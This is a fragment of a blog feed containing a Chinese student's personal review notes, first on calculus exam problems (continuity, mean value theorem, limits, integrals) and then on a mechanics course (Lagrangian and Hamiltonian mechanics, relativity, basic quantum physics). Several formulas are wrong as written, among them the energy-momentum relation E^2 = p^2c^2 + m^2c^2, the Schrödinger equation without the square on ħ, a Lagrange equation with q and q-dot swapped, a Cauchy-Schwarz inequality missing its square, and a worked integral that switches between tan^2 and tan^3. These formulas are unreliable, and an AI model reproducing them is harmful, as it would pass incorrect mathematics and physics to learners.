  &lt;li&gt;一致连续函数对加减法封闭, 对乘除法不封闭   &lt;br /&gt;
$x \times x$不连续, 因为取$x_n = \sqrt{n + 1}, y_n = \sqrt{n} \Rightarrow x_n^2 - y_n^2 \equiv 1 &amp;gt; \varepsilon$   &lt;br /&gt;
(类似的可以证明不一致连续)&lt;/li&gt;
  &lt;li&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;微分&quot;&gt;微分&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;$f$在$x=0$可导, 
\(a_n \rightarrow 0^-, b_n \rightarrow 0^+ \Rightarrow \lim_{n \rightarrow \infty} \frac{f(b_n) - f(a_n)}{b_n - a_n} = f'(0)\)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;要证明相等, 可以利用$|a - b| &amp;lt; \varepsilon$的思路, 构造
\(|(\frac{f(b_n)-f(0)}{b_n} - f'(0))\frac{b_n}{b_n - a_n} - (\frac{f(a_n)-f(0)}{a_n} - f'(0))\frac{a_n}{b_n - a_n}|\)
然后利用三角不等式, 最后证明在极限的情况下为零就可.&lt;/p&gt;

&lt;blockquote&gt;
\[(f g)^{(n)} = \sum_{i=0}^{n} (\begin{array}{l} i \\ n\end{array}) f^{(i)} g^{(n-i)} \\ \Rightarrow y = \arctan (x), y' = \frac{1}{1+x^2} \\ (1+x^2) y^{(n+1)} + 2 n x y^{(n)} + n (n-1) y^{(n-1)} = 0\]
&lt;/blockquote&gt;

&lt;p&gt;函数乘积的求导方法.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$f(x+y) = f(x) + f(y)$&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;利用构造的方式, (虽然个人感觉思路有点像是线性代数), 只要利用零元
$f(0) = f(0) + f(0)$, $f(n) = n f(n)$, 
$f(n \times \frac{1}{n}) =  n f(\frac{1}{n}) \Rightarrow f(\frac{1}{n}) = \frac{1}{n} f(1)$, 然后就可以构造得到$\forall x \in \mathbb{Q}, f(x) = f(1) x$&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$f(b) = f(a) + \frac{1}{2}(b - a)[f’(a) + f’(b)] - \frac{1}{12}(b - a)^3 f’’’(\xi)$&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;对于类似的长得就像是中值定理的题, 往往通过变换将含有$\xi$的项放一边, 
不含有的则放在另一边.&lt;/p&gt;

&lt;p&gt;一般来说会得到两种: 
\(\left\{\begin{array}{l} f^{(n)}(\xi) = F(x) \\ f^{(n)}(\xi) = \frac{F(x)}{G(x)} \end{array} \right.\)&lt;/p&gt;

&lt;p&gt;前面那种就去找零点, 然后就可以得到
$F(a) = F(b) = 0 \Rightarrow \exists \xi \in (a, b), F’(\xi) = 0$&lt;/p&gt;

&lt;p&gt;然后后面那种就找一个零点, 然后
$\frac{F(x)}{G(x)} = \frac{F(x) - F(a)}{G(x) - G(a)} = \frac{F’(x)}{G’(x)}$&lt;/p&gt;

&lt;p&gt;或者也有另外一种想法, 就是通过待定系数法, 让含有$\xi$的项成为一个系数, 
然后反解得到结果.&lt;/p&gt;

&lt;p&gt;或者也可以利用拉格朗日余项展开的方式. 想法就是对于一个区间, 
中点的函数值关于端点分别展开, 可以得到好的结论.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$f$二阶可导, 有界, $\exists f’’(\xi) = 0$&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;只要说明不能恒$&amp;gt;0$或$&amp;lt;0$, 即可. 正难则反.&lt;/p&gt;

&lt;p&gt;有一个推论: 有界的凸函数一定是常函数.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$f(x)$在$(a, b)$上可导, 然后$f’(x)$单调增加$\Rightarrow$连续函数&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;可导函数的性质: 可导$\Rightarrow$连续&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$f \equiv C, f(a) = f(c) = f(b), a &amp;lt; c &amp;lt; b \Rightarrow \exists x, f’‘(x) &amp;lt; 0$&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;还是反证法, 假如$f’‘(x) \geq 0$, 即上凸函数, 然后就画一条连接$a,b$的直线, 
然后就会产生矛盾.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$\lim_{x \rightarrow 0} \frac{1}{x^2} - \frac{1}{\sin^2 x} = \frac{1}{3}$&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;不妨直接通风, 然后就直接利用泰勒展开就好了. 
(或者也可以直接用Stokz公式)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$\frac{f(a+h)+f(a-h)-2f(a)}{h^2} = \frac{f’‘(a+\theta h) + f’‘(a - \theta h)}{2}$&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;思想就是一个待定系数法的想法, 就是$A = \frac{f(a+h)+f(a-h)-2f(a)}{h^2}$, 
然后就可以得到$F(x) = f(a + x) + f(a - x) - 2f(a) - A x^2$. 
然后就有$F(0) = F(h) = 0$就可以得到了.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$1^{\infty}$ 类型的极限, 取对数然后尝试洛必达.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
\[|f''| \leq M \Rrightarrow |f'(0)| + |f'(a)| \leq M a\]
&lt;/blockquote&gt;

&lt;p&gt;思路就是可以证明$f’$有最大值.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$f(x) = \left( \frac{a_1^x + a_2^x + \cdots + a_n^x}{n} \right)^{\frac{1}{x}}$ 幂平均不等式&lt;/p&gt;
  &lt;ul&gt;
    &lt;li&gt;$\lim_{x \rightarrow 0} f(x) = \sqrt{n}{a_1 \cdots a_n}$&lt;/li&gt;
    &lt;li&gt;$\lim_{x \rightarrow \infty} f(x) = max{a_1, \cdots, a_n}$&lt;/li&gt;
    &lt;li&gt;$f$在$\mathbb{R}$上递增&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;p&gt;注意的点:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;取极限的时候, 只有乘除的时候可以利用替换的方法, 不能在加减的时候替换. 
比如分子$\tan(x) - \sin(x)$不可以直接小量代了, 建议&lt;strong&gt;展开&lt;/strong&gt;或者&lt;strong&gt;洛必达&lt;/strong&gt;.&lt;/li&gt;
  &lt;li&gt;凸函数未必都有二阶导数, 所以想用二阶导数来验证凹凸性的时候就要很小心, 
因为很有可能会遇到很尴尬的事情. 一般可以利用凹凸性的定义来验证.&lt;/li&gt;
  &lt;li&gt;拉格朗日中值定理不可以推极限, 因为拉格朗日中值定理的存在$f’(\xi)$的存在, 
不代表一定连续, 所以取极限的时候不一定极限存在.&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;积分&quot;&gt;积分&lt;/h3&gt;
&lt;blockquote&gt;
  &lt;p&gt;$\int \tan^{n \geq 2} x \mathrm{d}x = \int \tan^{n - 2} x \frac{1 - \cos^2 x}{\cos^2 x} \mathrm{d} x = \int \tan^{n-2} \mathrm{d} \tan x - \int \tan^{n-2} x \mathrm{d} x$&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;$\int \frac{\sqrt{n}{1 + \sqrt{4}{x}}}{\sqrt{x}} \mathrm{d} x$&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;这里的想法就是换元积分, 思路就是如何把根号消除: 
$t = \sqrt{3}{1+\sqrt{4}{x}} \Rightarrow \int 12 t^3 (t^3 - 1) \mathrm{d} t$. 
面对这种有很复杂的东西(根号)的时候, 往往会想把最复杂的东西给换元了.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;对欧式: $A = \int e^{a x} \sin b x \mathrm{d} x, B = \int e^{b x} \sin a x \mathrm{d} x$&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;就是一个二元递推式, 然后解线性递推方程.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;欧拉变换: 
\(\sqrt{a x^2 + b x + c} = \left\{ \begin{array}{l} t - \sqrt{a x} \\ t x - \sqrt{c} \end{array} \right.\)
这样换元有时候可以很妙&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;柯西不等式: $\int_a^b (f(x) - t g(x))^2 \mathrm{d} x \geq 0 \Rightarrow \Delta_t = 4(\int_a^b f^2 \mathrm{d} x \int_a^b g^2 \mathrm{d} x - \int_a^b f g \mathrm{d} x) \leq 0 \Rightarrow \int_a^b f^2 \mathrm{d} x \int_a^b g^2 \mathrm{d} x \leq \int_a^b f g \mathrm{d} x)$&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;这个证明的思想就是利用二次函数的判别式的方法来证明, 这个思想很棒, 
用了一个和$x$完全无关的$t$, 然后有一个结论.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;柯西不等式的应用: $\int_0^{\pi} x a^{\sin x}\mathrm{d} x \int_0^{\frac{\pi}{2}} x a^{- \cos x}\mathrm{d} x = \int_{\pi}^{0} (\pi - t) a^{\sin t}\mathrm{d} t \int_0^{\frac{\pi}{2}} x a^{\sin x}\mathrm{d} x = \pi \int_0^{\frac{\pi}{2}} a^{\cos t} \mathrm{d} t \int_0^{\frac{\pi}{2}} a^{- \cos x} \mathrm{d} x \geq \pi (\int_0^{\frac{\pi}{2}} 1 \mathrm{d} x)^2$&lt;/p&gt;
&lt;/blockquote&gt;

&lt;blockquote&gt;
  &lt;p&gt;积分中的洛必达法则: 
\(\lim_{x \rightarrow \infty} \frac{\int_0^x f(t)\mathrm{d}t}{x} = \lim_{x \rightarrow \infty} \frac{f(x)}{1} = f(\infty) = A\)&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;其实用到了一个变上限积分的思路&lt;/p&gt;

&lt;p&gt;(用定义来证明也不是不行, 但是还是这个爽啊. )&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;分部积分: $I_{m,n} = \int_0^{\frac{\pi}{2}} \sin^m x \cos^n x \mathrm{d} x = \int_0^{\frac{\pi}{2}} \sin^m x (\cos^{n-1} x \mathrm{d} x)= - m I_{m,n} + (n -1) I_{m,n-2} \Rightarrow I(m, n) = \frac{m - 1}{m + n} I_{m - 2, n}$  &lt;br /&gt;
并且$I(0, n) = \frac{(n - 1)!!}{(n)!!} \frac{\pi}{2}$&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;注:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;有些时候, 试试看用定义(达布和或者说是黎曼和之类的)也会让计算简单&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;其他一些奇奇怪怪题&quot;&gt;其他一些奇奇怪怪题&lt;/h3&gt;
&lt;blockquote&gt;
\[\int_0^{\frac{\pi}{2}} \frac{1}{1 + \tan^2 x} \mathrm{d} x\]
&lt;/blockquote&gt;

&lt;p&gt;对于这种带三角函数的$0$到$\pi$的积分的函数, 往往可以尝试反过来积分, 
就是从$\pi$到$0$积分, 然后构造一个变换的元$u = \frac{\pi}{2} - x$: 
\(= \int_{\frac{\pi}{2}}^{0} - \frac{\mathrm{d} u}{1 + \cot^3 u} \\ = \int^{\frac{\pi}{2}}_{0} \frac{\tan^3 u \mathrm{d} u}{1 + \tan^3 u} \\ = 1 - \int_0^{\frac{\pi}{2}} \frac{1}{1 + \tan^2 x} \mathrm{d} x = \frac{1}{2}\)&lt;/p&gt;

&lt;p&gt;类似的方法还有:&lt;/p&gt;

&lt;blockquote&gt;
\[\int_0^1 x (1 - x)^6 \mathrm{d} x\]
&lt;/blockquote&gt;

&lt;p&gt;也是改变积分的方向, 从$1$积到$0$, 就好了$t = 1 - x$: 
\(- \int_1^0 (1-t) t^6 \mathrm{d} t\)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$f(x)$在$[0, 1]$上下凸, 证明$e^{f(x)}$下凸.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;这个的证明不可以直接用二阶导数, 因为没有说是否二阶可导, 假如二阶可导, 
那简直就是简单到笑掉大牙了. 只能从定义出发证明. 记$F(x) = e^{f(x)}$, 则: 
\(F(\lambda x_1 + (1 - \lambda) x_2) &amp;lt; \lambda F(x_1) + (1 - \lambda) F(x_2)\\ \Leftarrow e^{f(\lambda x_1 + (1 - \lambda) x_2)} \leq e^{\lambda f(x_1) + (1 - \lambda) f(x_2)} \leq \lambda e^{f(x_1)} (1 - \lambda) e^{f(x_2)}\)&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;$\mathbb{R}$上非常值的连续周期函数一定有最小周期&lt;/p&gt;
&lt;/blockquote&gt;

&lt;table&gt;
  &lt;tbody&gt;
    &lt;tr&gt;
      &lt;td&gt;反证法, 假如没有最小的周期, 构造一个$&lt;/td&gt;
      &lt;td&gt;x_1 - x_2&lt;/td&gt;
      &lt;td&gt;&amp;lt; \delta \Rightarrow&lt;/td&gt;
      &lt;td&gt;f(x_1) - f(x_2)&lt;/td&gt;
      &lt;td&gt;&amp;lt; \varepsilon$, 假如周期比$\delta$小就会和非常值矛盾.&lt;/td&gt;
    &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;

&lt;blockquote&gt;
\[f可导, f(0) = 0, f(x) &amp;gt; 0, \exists \xi \in (0, 1), \frac{f'(\xi)}{3f(\xi)} = \frac{f'(1 - \xi)}{1 - \xi}\]
&lt;/blockquote&gt;

&lt;p&gt;构造函数就好了, 这种有系数的话, 就可以去想想构造一个幂函数. 
\(f(\xi)f^3(1 - \xi)\)&lt;/p&gt;

&lt;blockquote&gt;
\[f \in C^3(\mathbb{R}), f'(0) = 1, f''(0) = 0, f'''(0) &amp;lt; 0, a_1 = 1, a_{n+1} = f(a_n), \lim_{n \rightarrow \infty} a_n = 0 = a, \lim_{n\rightarrow\infty} = ?\]
&lt;/blockquote&gt;

&lt;p&gt;利用泰勒展开: 
\(f(a_n) = f(0) + f'(0) a_n + \frac{1}{2} f''(0) a_n^2 + \frac{1}{6} f'''(0) a_n^3 + o(a_n^3) = a_n + \frac{1}{6} f'''(0) a_n^3 + o(a_n^3) \Rightarrow \frac{1}{a_{n+1}^2} - \frac{1}{a_n^2} = \frac{a_n^2 - a_{n+1}^2}{a_n^2 a_{n + 1}^2} = \frac{a_n^2 - (f(a_n))^2}{a_n^4} = \frac{a_n^2 - (a_n + \frac{1}{6} f'''(0) a_n^3 + o(a_n^3))^2}{a_n^4} \Rightarrow = - \frac{1}{3}f'''(0)\)&lt;/p&gt;

&lt;h2 id=&quot;后记&quot;&gt;后记&lt;/h2&gt;
&lt;p&gt;没救了, 题目的题型分布和格式确实和期末练习一样, 但是就是感觉有点不对味.&lt;/p&gt;

&lt;p&gt;泪目…&lt;/p&gt;</content><author><name></name></author><category term="notes" /><summary type="html">微积分期末复习 就是一个慌.</summary></entry><entry><title type="html">Mechanics The End</title><link href="http://0.0.0.0:4000/notes/mechanics-final/" rel="alternate" type="text/html" title="Mechanics The End" /><published>2022-01-03T03:12:50+00:00</published><updated>2022-01-03T03:12:50+00:00</updated><id>http://0.0.0.0:4000/notes/mechanics-final</id><content type="html" xml:base="http://0.0.0.0:4000/notes/mechanics-final/">&lt;h1 id=&quot;力学-the-end&quot;&gt;力学 The End&lt;/h1&gt;
&lt;p&gt;就是对这个学期学的力学的&lt;em&gt;完全的&lt;/em&gt;不完全归纳复习. 
应该会有和之前的重复的部分, 就当是一个学吧.&lt;/p&gt;

&lt;p&gt;假如用一句话来概括的话, 经典力学就是所有满足伽利略变换不变性的力学性质.&lt;/p&gt;

&lt;blockquote&gt;
  &lt;p&gt;伽利略变换: 是没有原点的仿射变换&lt;/p&gt;
  &lt;ul&gt;
    &lt;li&gt;3 个平动&lt;/li&gt;
    &lt;li&gt;3 个平移&lt;/li&gt;
    &lt;li&gt;3 个转动&lt;/li&gt;
    &lt;li&gt;1 个时间平移&lt;/li&gt;
  &lt;/ul&gt;
&lt;/blockquote&gt;

&lt;h2 id=&quot;理论部分&quot;&gt;理论部分&lt;/h2&gt;
&lt;h3 id=&quot;pla-principle-of-least-action&quot;&gt;PLA (Principle of Least Action)&lt;/h3&gt;
&lt;p&gt;作为我认为的一种很妙的思想, 我觉得我应该把&lt;em&gt;最小作用量原理&lt;/em&gt;写到最前面.&lt;/p&gt;

&lt;ul&gt;
  &lt;li&gt;和光学的类比&lt;/li&gt;
&lt;/ul&gt;

&lt;h3 id=&quot;newtons-principa&quot;&gt;Newton’s Principa&lt;/h3&gt;
&lt;p&gt;牛顿的三个定律:&lt;/p&gt;
&lt;ul&gt;
  &lt;li&gt;&lt;strong&gt;N1&lt;/strong&gt;:&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;N2&lt;/strong&gt;: force is the time rate of momentum. $\boldsymbol{F} = \frac{\mathbb{d}\boldsymbol{p}}{\mathbb{d}t}$&lt;/li&gt;
  &lt;li&gt;&lt;strong&gt;N3&lt;/strong&gt;: action and reaction&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;一个重要概念: 加速度和速度是独立的量.&lt;/p&gt;

&lt;h4 id=&quot;刚体&quot;&gt;刚体&lt;/h4&gt;

\[\boldsymbol{r}(\nabla_{\boldsymbol{v}} \cdot \boldsymbol{\omega}) = \boldsymbol{I} \boldsymbol{\omega}\]

&lt;p&gt;其中二阶张量$\boldsymbol{I} = \boldsymbol{r}\nabla_{\boldsymbol{v}} = …$&lt;/p&gt;

&lt;h4 id=&quot;first-principle&quot;&gt;First Principle&lt;/h4&gt;
&lt;blockquote&gt;
  &lt;p&gt;That (Noether’s) theorem has been guiding star to 
the 20th and 21st theoretical physics.    &lt;br /&gt;
– Frank Wilctek&lt;/p&gt;
&lt;/blockquote&gt;

&lt;ul&gt;
  &lt;li&gt;Impluse:     &lt;br /&gt;
\(\boldsymbol{p}_1 - \boldsymbol{p}_2 = \int_{t_1}^{t_2} \boldsymbol{f} \mathrm{d} t\)&lt;/li&gt;
  &lt;li&gt;Energy:    &lt;br /&gt;
\(\boldsymbol{f} = \frac{\mathbb{d}\boldsymbol{p}}{\mathbb{d}t} = m \frac{\mathbb{d}\boldsymbol{v}}{\mathbb{d}t} \\ \boldsymbol{f} \cdot \boldsymbol{v} = m \boldsymbol{v} \cdot \frac{\mathbb{d}\boldsymbol{v}}{\mathbb{d}t} \\ \int_{\boldsymbol{r}_1}^{\boldsymbol{r}_2} \boldsymbol{f} \cdot \mathrm{d}\boldsymbol{r} = \int_{\boldsymbol{v}_1}^{\boldsymbol{v}_2} \frac{1}{2} m \mathrm{d}(\boldsymbol{v}^2) = \Delta T\)     &lt;br /&gt;
并且对于保守场:     &lt;br /&gt;
\(\boldsymbol{F} = - \nabla \phi\)&lt;/li&gt;
  &lt;li&gt;Angular Momentum:    &lt;br /&gt;
\(\boldsymbol{L} = \boldsymbol{r} \times \boldsymbol{p} \\ \frac{\mathrm{d} \boldsymbol{L}}{\mathrm{d} t} = \boldsymbol{v} \times \boldsymbol{p}_{= m \boldsymbol{v}} + \boldsymbol{r} \times \boldsymbol{f} = \boldsymbol{r} \times \boldsymbol{f} \\ \mathrm{d} \boldsymbol{L} = \boldsymbol{r} \times \boldsymbol{f} \mathrm{d} t = \boldsymbol{M}\)&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;(注: 类似于这样的, 从第一性原理出发构建一个理论框架, 
比如有连续介质力学的八公理系统, 里面就有一致性定理和完备性定理)&lt;/p&gt;

&lt;h3 id=&quot;lagrange-analytic-mechanics&quot;&gt;Lagrange Analytic Mechanics&lt;/h3&gt;
&lt;p&gt;关键是找到&lt;strong&gt;拉氏量&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;对于保守系统:&lt;/p&gt;

\[L = T - V \\
\frac{\mathrm{d}}{\mathrm{d}}(\frac{\partial L}{\partial q_i}) - \frac{\partial L}{\partial \dot{q_i}} = 0\]

&lt;p&gt;然后就通过解方程就可以得到运动的结论了.&lt;/p&gt;

&lt;h4 id=&quot;virtual-displacement--real-displacement&quot;&gt;Virtual Displacement &amp;amp; Real Displacement&lt;/h4&gt;
&lt;p&gt;和Real Displacement不同的是, Virtual Displacement是一个时间冻结下的运动, 
就是说, 假如Real Displacement是:&lt;/p&gt;

\[\mathrm{d} \boldsymbol{r} = \frac{\partial \boldsymbol{r}}{\partial t} \mathrm{d} t + \sum \frac{\partial \boldsymbol{r}}{\partial q_{i}} \mathrm{d} q_{i}\]

&lt;p&gt;那么Virtual Displacement就会是:&lt;/p&gt;

\[\delta \boldsymbol{r} = \sum \frac{\partial \boldsymbol{r}}{\partial q_{i}} \delta q_{i}\]

&lt;p&gt;其中的$\delta q_i$是任意的满足约束的位移(广义坐标), 这样的偏移量是任意的, 
(只要是满足约束的).&lt;/p&gt;

&lt;p&gt;(注: 这样的由广义坐标组成的空间叫做Configuration Space位形空间, 由Riemann 
Geometry)&lt;/p&gt;

&lt;p&gt;并且关于这个, 还有两个拉格朗日关系:&lt;/p&gt;

\[\left\{ \begin{array}{lll} \frac{\partial}{\partial \dot{q_{\beta}}} (\frac{\mathrm{d} \boldsymbol{r}}{\mathrm{d} t}) &amp;amp; = &amp;amp; \frac{\partial \boldsymbol{r}}{\partial q_{\beta}} \\ \frac{\partial }{\partial q_{\beta}} (\frac{\mathrm{d} \boldsymbol{r}}{\mathrm{d} t}) &amp;amp; = &amp;amp; \frac{\mathrm{d}}{\mathrm{d} t} (\frac{\partial \boldsymbol{r}}{\partial q_{\beta}})\end{array} \right.\]

&lt;h4 id=&quot;eulers-theorem-of-homogenous-functioin&quot;&gt;Euler’s Theorem of Homogenous Functioin&lt;/h4&gt;
&lt;p&gt;对于$\lambda$次齐次函数:&lt;/p&gt;

\[f(\alpha x_1, \cdots, \alpha x_n) = \alpha^{\lambda} f(x_1, \cdots, x_2) \\ \frac{\mathrm{d} f}{\mathrm{d} \alpha} = \frac{\partial f}{\partial (\alpha x_i)} \frac{\partial (\alpha x_i)}{\partial \alpha} = \lambda \alpha^{\lambda - 1} f \\ \Rightarrow \alpha \frac{\mathrm{d} f}{\mathrm{d} \alpha} = \lambda f\]

&lt;p&gt;于是可以说有这样的结论:&lt;/p&gt;

\[\alpha \frac{\mathrm{d} f}{\mathrm{d} \alpha} = \lambda f\]

&lt;h4 id=&quot;位力定律&quot;&gt;位力定律&lt;/h4&gt;
&lt;p&gt;对动能(速度的2次齐次函数)应用Euler齐次函数定理:&lt;/p&gt;

\[2 K = \frac{\partial K}{\partial \boldsymbol{v}} \boldsymbol{v} = \boldsymbol{p} \frac{\mathrm{d} \boldsymbol{r}}{\mathrm{d} t} = \frac{\mathrm{d}}{\mathrm{d} t}(\boldsymbol{p} \cdot \boldsymbol{r}) - \frac{\mathrm{d} \boldsymbol{p}}{\mathrm{d} t} \cdot \boldsymbol{r}\]

&lt;p&gt;对两端取时间平均, 相对一个时间无穷大的情况, 然后对于有限的运动, 
即$(\boldsymbol{p} \cdot \boldsymbol{r})$有限, 所以相对无穷的时间平均, 
$\lim_{\tau \rightarrow \infty} \langle m \rangle_{\tau} = 0$. 于是得到:&lt;/p&gt;

\[\overline{2K} = \overline{- \boldsymbol{r} \cdot \boldsymbol{F}} = \overline{\boldsymbol{r} \cdot \frac{\partial U}{\partial \boldsymbol{r}}} = \lambda \overline{U}\]

&lt;p&gt;于是能量就可以写成&lt;/p&gt;

\[E = (\frac{\lambda}{2} + 1) \overline{U}\]

&lt;h4 id=&quot;力学相似性&quot;&gt;力学相似性&lt;/h4&gt;
&lt;p&gt;就是怎样的坐标和时间变换才能满足力学系统的不变性.&lt;/p&gt;

&lt;p&gt;对于拉氏方程: $L = T - V$, 可以知道$T = \frac{1}{2} m \dot{q}^2$, 
也就是会有在相似变换$q \mapsto \alpha q, t \mapsto \beta t$下, 
有$L’ = T’ - V’ = (\frac{\alpha}{\beta})^{\lambda_{T}} T - (\alpha)^{\lambda_{V}} V$, 这里假设$T$, $V$都是齐次函数.&lt;/p&gt;

&lt;p&gt;于是就可以说, 假如$L$要满足条件, 即$L / L’ = c$就是只差一个系数的话, 
那么就可以保证方程不变, 也就是力学相似性.&lt;/p&gt;
&lt;h4 id=&quot;lagrange-的一些用法&quot;&gt;Lagrange 的一些用法&lt;/h4&gt;
&lt;ul&gt;
  &lt;li&gt;Ignorable Coordinate (Cyclic Coordinate)    &lt;br /&gt;
对于$L$中不显含$q_{\alpha}$的系统, 关于广义动量守恒, 
即$\frac{\mathrm{d}}{\mathrm{d} t}(\frac{\partial L}{\partial \dot{q_{\alpha}}}) = 0$, 
于是就可以得到守恒的结论.&lt;/li&gt;
  &lt;li&gt;Energy Conservation   &lt;br /&gt;
对于$\frac{\partial L}{\partial t} = 0$, 就有能量守恒式的形式.&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;lagrange-equtation-proof&quot;&gt;Lagrange Equtation Proof&lt;/h4&gt;
&lt;p&gt;证明拉格朗日方程的方法.&lt;/p&gt;

&lt;p&gt;从达朗贝尔原理开始:&lt;/p&gt;

\[\boldsymbol{F} - \sum m \delta \ddot{\boldsymbol{r}_i} = 0\]

&lt;p&gt;利用拉格朗日关系可以得到, 以前有写过. 略.&lt;/p&gt;

&lt;p&gt;或者也可以通过$\delta S = 0$, 利用作用量的思路来做事:&lt;/p&gt;

&lt;p&gt;(一个很新的做法)&lt;/p&gt;

\[\]

&lt;p&gt;(或者干脆就$\delta \int L \mathrm{d} t = 0 \Rightarrow \mathrm{Lagrange\ Equation}$, 利用变分法里面的欧拉公式. )&lt;/p&gt;

&lt;h3 id=&quot;hamilton-mechanics&quot;&gt;Hamilton Mechanics&lt;/h3&gt;
&lt;p&gt;Hamilton量的构造:&lt;/p&gt;

\[H = \sum_{\alpha} p_{\alpha} \dot{q}_{\alpha} - L\]

&lt;p&gt;(这里要注意的就是, 其中$L(q, \dot{q}, t)$, 要想构造出$H(q, p, t)$的话, 
就要把$L$中的$\dot{q}$做换元代掉. )&lt;/p&gt;

\[\left\{ \begin{array}{lll}\dot{p}_i &amp;amp; = &amp;amp; - \frac{\partial H}{\partial q_i} \\ \dot{q}_i &amp;amp; = &amp;amp; \frac{\partial H}{\partial p_i}\end{array}\right.\]

&lt;ul&gt;
  &lt;li&gt;Legendre Transformation    &lt;br /&gt;
变换的核心思想就是
\(\mathrm{d} L = \frac{\partial L}{\partial q} \mathrm{d} q + \frac{\partial L}{\partial \dot{q}} \mathrm{d} \dot{q}\)
就是$H$函数的全微分, 目标就是为了改变函数的变元, 将$L(q, \dot{q})$变成
$H(q, p)$的变元, 为了达到这样的目的, 就需要把全微分的形式变掉. 
也就是变成
\(\mathrm{d} H = \frac{\partial H}{\partial q} \mathrm{d} q + \frac{\partial H}{\partial p} \mathrm{d} \dot{p}\)
的形式, 为了达到这样的结果, 构造$H = \frac{\partial L}{\partial \dot{q}} \dot{q} - L = p \dot{q} - L$, 
于是就可以得到一个$\mathrm{d} H = \dot{q} \mathrm{d} p - \dot{p} \mathrm{d} q$&lt;/li&gt;
  &lt;li&gt;补充的关系式: $\frac{\partial H}{\partial t} = - \frac{\partial L}{\partial t}$, 
也就是说, 对于不含时间的$L$的系统, $H$守恒&lt;/li&gt;
  &lt;li&gt;补充的说明: 对于保守系统, $H = E$&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&quot;possion-bracket&quot;&gt;Possion Bracket&lt;/h4&gt;

\[\frac{\mathrm{d} f}{\mathrm{d} t} = \frac{\partial f}{\partial t} + [f, H]\]

&lt;h3 id=&quot;special-relativity&quot;&gt;Special Relativity&lt;/h3&gt;
&lt;p&gt;Lorentz Transformation:&lt;/p&gt;

\[\gamma = \frac{1}{\sqrt{1 - (\frac{v}{c})^2}} \\ x' = \gamma (x - v t) \\ y' = y \\ z' = z \\ t' = \gamma (t - \frac{v x}{c^2})\]

&lt;h4 id=&quot;minkowski-spacetime&quot;&gt;Minkowski Spacetime&lt;/h4&gt;

&lt;h4 id=&quot;energy-momentum-relation&quot;&gt;Energy Momentum Relation&lt;/h4&gt;

\[E^2 = p^2 c^2 + m^2 c^2\]

&lt;p&gt;(推导的方法就是$E = \gamma m c^2$, 然后通过改变分母就可以拆分得到结果. )&lt;/p&gt;

&lt;h3 id=&quot;quantum-physics-very-basic&quot;&gt;Quantum Physics (Very Basic)&lt;/h3&gt;
&lt;h4 id=&quot;修正条件&quot;&gt;修正条件&lt;/h4&gt;
&lt;p&gt;当作用量的量级和$h$相同甚至更小的时候就需要对经典物理学进行修正. 
可以在海森堡不确定性原理里面看到.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;Heisenberg Uncertainty Principle&lt;/strong&gt;&lt;/p&gt;

\[\begin{array}{lll} \Delta E \Delta t &amp;amp; \geq &amp;amp; \hbar / 2 \\ \Delta \boldsymbol{p} \cdot \Delta \boldsymbol{x} &amp;amp; \geq &amp;amp; \hbar / 2 \\ \Delta \tau \Delta \theta &amp;amp; \geq &amp;amp; \hbar / 2 \end{array}\]

&lt;h4 id=&quot;schodingger-equation&quot;&gt;Schodingger Equation&lt;/h4&gt;
&lt;p&gt;1st order in time, 2nd order in space, 不满足洛伦兹协变&lt;/p&gt;

\[H = \frac{p^2}{2m} + V = E \\ H \mapsto \hat{E} = i \hbar \frac{\partial}{\partial t}, \hat{\boldsymbol{p}} = i \hbar \nabla \\ - \frac{\hbar}{2m} \nabla^2 \psi + V \psi = i \hbar \frac{\partial}{\partial t} \psi\]

&lt;p&gt;这里的运用了一种叫做算符化的神奇操作, 我不是很清楚, 但是我们老师说可以做. 
